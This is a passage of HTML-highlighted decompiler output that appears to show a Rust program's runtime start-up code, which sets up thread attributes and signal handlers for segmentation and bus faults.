0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108._48_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    DAT_0017faf0 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> uVar8;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    __th \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> pthread_self\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> pthread_getattr_np\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(__th,\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_108);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    bVar19 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#E1E4E8\">bVar19) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">LAB_00112832:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_88 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      uStack_80._0_4_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      uStack_80._4_4_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_98 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      uStack_90 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_a8 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      uStack_a0 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_b8 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      uStack_b0 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_c8 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      uStack_c0 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_108._48_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      uStack_d0 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_108._32_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_108._40_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_108._16_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_108._24_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_108.__align._0_4_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_108.__align._4_2_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_108.__align._6_2_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_108._8_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      local_78 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (_func_5327 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">      sigaction\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">b\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,(sigaction \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,(sigaction \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_108);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ((pollfd)local_108.__align \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (pollfd)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (DAT_0017fb00 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> '\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\0\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          DAT_0017fb00 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> '\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\x01\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">                    /* try { // try from 001128a0 to 00112986 has its CatchHandler @ 00112b44 */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          DAT_0017faf8 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> FUN_0014f930\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">          if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            puVar10 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (undefined4 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">malloc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (puVar10 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (undefined4 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> LAB_00112b2c;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">puVar10 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">6e69616d\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            FUN_00134b20\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar18,ppVar6,puVar10);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          bVar19 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> false\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        uStack_80._0_4_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">8000004\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        local_108.__align \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">long\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)FUN_0014fb00;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        sigaction\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">b\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,(sigaction \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_108,(sigaction \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">      sigaction\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">7\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,(sigaction \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,(sigaction \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_108);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ((pollfd)local_108.__align \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (pollfd)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (DAT_0017fb00 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> '\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\0\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          DAT_0017fb00 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> '\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\x01\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          DAT_0017faf8 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> FUN_0014f930\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">          if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (bVar19) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            puVar10 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (undefined4 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">malloc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (puVar10 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (undefined4 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">LAB_00112b2c:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">                    /* WARNING: Subroutine does not return */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">              FUN_00107193\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">PTR_s_\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">build\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">rustc\u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#FDAEB7;font-style:italic\">1.89.0\u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\">src\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">library\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">_0017df00);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">puVar10 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">6e69616d\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            FUN_00134b20\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar18,ppVar6,puVar10);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        uStack_80._0_4_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">8000004\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        local_108.__align \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">long\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)FUN_0014fb00;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        sigaction\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">7\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,(sigaction \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_108,(sigaction \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        lVar9 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">long\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(in_FS_OFFSET \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        lVar11 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> DAT_0017fb08;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        lVar9 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">long\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(in_FS_OFFSET \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        lVar11 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> DAT_0017fb08;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      _DAT_0017fa58 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> param_2;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      DAT_0017fb08 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar11;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (lVar9 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        do\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">          if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (lVar11 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">                    /* try { // try from 00112a54 to 00112b41 has its CatchHandler @ 00112b44 */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            FUN_0010e5c0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> LAB_00112b42;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          lVar9 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar11 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">          LOCK\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          bVar19 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar11 \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> DAT_0017fb08;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar9;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">          if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (bVar19) 